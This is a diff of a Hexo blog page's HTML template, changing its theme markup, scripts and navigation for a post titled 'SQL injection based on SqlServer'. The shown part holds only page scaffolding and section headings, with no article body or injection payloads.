@@ -1,342 +1,575 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
+  <!-- meta/link... -->
+  
+
+
+
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
+  <title>基于SqlServer的SQL注入 | CurlySean&#39;s Blog</title>
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"curlysean.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
-
-    <meta name="description" content="基于SqlServer的SQL注入 前言 最近面试了几家实习，都问了基于SqlServer的SQL注入，所以今天想补一下基础。  SqlServer搭建 搭建SqlServer，我们的环境和版本如下：   Windows Server 2012 SqlServer 2012  这里的SqlServer环境搭建比较简单，可以参考该链接进行安装 https:&#x2F;&#x2F;blog.csdn.net&#x2F;gengku">
-<meta property="og:type" content="article">
-<meta property="og:title" content="基于SqlServer的SQL注入">
-<meta property="og:url" content="http://curlysean.github.io/2025/07/09/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/index.html">
-<meta property="og:site_name" content="肖恩的博客">
-<meta property="og:description" content="基于SqlServer的SQL注入 前言 最近面试了几家实习，都问了基于SqlServer的SQL注入，所以今天想补一下基础。  SqlServer搭建 搭建SqlServer，我们的环境和版本如下：   Windows Server 2012 SqlServer 2012  这里的SqlServer环境搭建比较简单，可以参考该链接进行安装 https:&#x2F;&#x2F;blog.csdn.net&#x2F;gengku">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749273823298-089e8d08-ccaa-49dc-82f8-17a60af1f3bc.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274154500-0fbfc9ac-df90-4df4-a735-d3905eef6611.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274430512-4d8c38c1-16bd-419b-9239-7e71cb1cf558.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274538213-7a61e8f0-f9b1-42fa-980e-0d0034267d3e.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274637417-9a73bfad-551d-49c6-a02a-9ea4a55cfd8d.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274859375-1b2cfc38-dada-475c-9c7a-56c66ee3b16c.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749278764229-24daed4b-4130-40f2-ba42-c3e5aa3a7181.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279018263-2dfcd35e-23eb-4c24-8a63-ec895ad57e94.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279529839-7ee6566a-38e7-4727-87db-72943da5821a.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279598408-007810b0-f16a-426a-a2e3-8b8b832a4047.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280514056-1d5ed736-6607-41e8-b4c8-be5316676472.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280632611-aafdf99b-293c-4352-97d7-583c58c60f86.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280830221-499a2f79-e52b-47bd-8bbe-0af4df071a1b.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281119355-7d4fd5ba-02ed-464c-a318-52ceeebc0ab0.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281211809-ec2880ea-f667-478d-8c18-5232593c7e66.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282258075-d68d6a5b-27a6-49e3-b992-9c026270f216.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282277131-f0d9112d-7702-4c8c-80c0-3e567dd07eaf.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350362233-3bb50919-4dee-443d-a521-2cd26e378cfe.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350783382-420b25f3-128f-4556-a68c-5f13562a33cb.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351877891-2432a32c-cfb1-4f2b-baf8-278e35bb21f1.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351925683-be991476-3931-45a6-9e61-80ca7cab0cea.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749353320049-8a35d83b-9f4d-4d6b-8453-a046de1b53e5.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358034266-f1ca5108-e55a-4bbf-a10a-7e9b28f04240.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358196631-3425d161-db38-4843-875e-78d885791f7b.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358344892-388847df-803f-478d-9e43-f21c93308625.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359514500-d4417e71-1035-4e8e-8349-26516dccc2e8.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359997217-3ebd3e53-c8bb-4bfe-ac61-f51a6f57347e.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360255270-e63390ae-72d1-46a3-ad5e-13a58a6b6e05.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360227353-a350a9b9-fe3d-41f9-b34e-c424b1bb1b56.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749362631456-529373c6-eb7f-4ed3-81ec-434d7ed409e5.png">
-<meta property="article:published_time" content="2025-07-09T12:27:27.132Z">
-<meta property="article:modified_time" content="2025-07-09T12:27:41.360Z">
-<meta property="article:author" content="Sean">
-<meta property="article:tag" content="Web">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749273823298-089e8d08-ccaa-49dc-82f8-17a60af1f3bc.png">
-
-
-<link rel="canonical" href="http://curlysean.github.io/2025/07/09/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://curlysean.github.io/2025/07/09/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/","path":"2025/07/09/基于SqlServer的SQL注入/","title":"基于SqlServer的SQL注入"}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>基于SqlServer的SQL注入 | 肖恩的博客</title>
+  <link rel="icon" type="image/png" href="/medias/logo.png">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
   
-
-
-
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-
-  <main class="main">
-    <div class="column">
-      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">肖恩的博客</p>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="搜索" role="button">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup">
-      <div class="search-header">
-        <span class="search-icon">
-          <i class="fa fa-search"></i>
-        </span>
-        <div class="search-input-container">
-          <input autocomplete="off" autocapitalize="off" maxlength="80"
-                placeholder="搜索..." spellcheck="false"
-                type="search" class="search-input">
-        </div>
-        <span class="popup-btn-close" role="button">
-          <i class="fa fa-times-circle"></i>
-        </span>
-      </div>
-      <div class="search-result-container">
-        <div class="search-result-icon">
-          <i class="fa fa-spinner fa-pulse fa-5x"></i>
-        </div>
-      </div>
-    </div>
-  </div>
-
-</header>
-        
   
-  <aside class="sidebar">
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
+  
+<link rel="stylesheet" href="/css/style.css">
 
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Ie5J5"><span class="nav-number">1.</span> <span class="nav-text">基于SqlServer的SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#YBV7G"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#o2JTT"><span class="nav-number">1.2.</span> <span class="nav-text">SqlServer搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vucaF"><span class="nav-number">1.3.</span> <span class="nav-text">SqlServer基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ZNxWD"><span class="nav-number">1.3.1.</span> <span class="nav-text">默认数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#kL0Os"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">系统数据库：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#qWTUS"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">实例数据库：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VGws7"><span class="nav-number">1.3.2.</span> <span class="nav-text">数据库的组成</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cgnEs"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Eo4Ms"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">文件组</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x8Cvj"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">设计原则</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cm4QN"><span class="nav-number">1.3.3.</span> <span class="nav-text">SqlServer权限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ybo2c"><span class="nav-number">1.4.</span> <span class="nav-text">T-SQL语言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dfWqj"><span class="nav-number">1.4.1.</span> <span class="nav-text">创建数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#waUGu"><span class="nav-number">1.4.2.</span> <span class="nav-text">创建表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bGBmK"><span class="nav-number">1.4.3.</span> <span class="nav-text">增删改查</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Ece5h"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">插入数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TGGaN"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">删除数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Xbebe"><span class="nav-number">1.4.3.3.</span> <span class="nav-text">修改数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#egPq9"><span class="nav-number">1.4.3.4.</span> <span class="nav-text">查询数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#X0Ppb"><span class="nav-number">1.5.</span> <span class="nav-text">SqlServer手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#qdFxg"><span class="nav-number">1.5.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lZpDf"><span class="nav-number">1.5.2.</span> <span class="nav-text">常见注入函数和关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HZao5"><span class="nav-number">1.5.3.</span> <span class="nav-text">注入手法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JU1ft"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">联合查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pnSUl"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IeAWT"><span class="nav-number">1.5.3.3.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#KxKAK"><span class="nav-number">1.5.3.4.</span> <span class="nav-text">延时注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zxVml"><span class="nav-number">1.6.</span> <span class="nav-text">SqlServer命令执行</span></a></li></ol></li></ol></div>
-        </div>
-        <!--/noindex-->
+  
+  
+    <link href="https://unpkg.com/@fancyapps/ui@5.0/dist/fancybox/fancybox.css" rel="stylesheet">
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
 
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Sean"
-      src="/images/avatar.jpg">
-  <p class="site-author-name" itemprop="name">Sean</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">33</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">3</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">15</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-
-        </div>
-      </div>
-    </div>
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script defer src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
 
     
-  </aside>
+    
+    <!-- 依赖于jquery和vue -->
+    <script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
+    <script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>
 
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  
+  <!-- 预加载动画 -->
+  
+  
+  <div class="preloader_6" id="loader">
+  <div class="loader"></div>
+</div>
+  <script>
+    var endLoading = function () {
+      document.body.style.overflow = 'auto';
+      document.getElementById('loader').classList.add("loaded");
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+  </script>
+
+
+  <body>
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script defer>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (src) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://unpkg.com/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header  " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <h3 class="drawer-box-head_title">CurlySean&#39;s Blog</h3>
+      <h5 class="drawer-box-head_desc"></h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/tags" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/CurlySean">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
 
     </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">CurlySean&#39;s Blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/" class="menu-item-link" title="首页">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/tags" class="menu-item-link" title="标签">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
 
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/07/09/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Sean">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="肖恩的博客">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="基于SqlServer的SQL注入 | 肖恩的博客">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          基于SqlServer的SQL注入
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2025-07-09 20:27:27 / 修改时间：20:27:41" itemprop="dateCreated datePublished" datetime="2025-07-09T20:27:27+08:00">2025-07-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-        </span>
-    </span>
-
+    </nav>
+  </div>
   
-    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
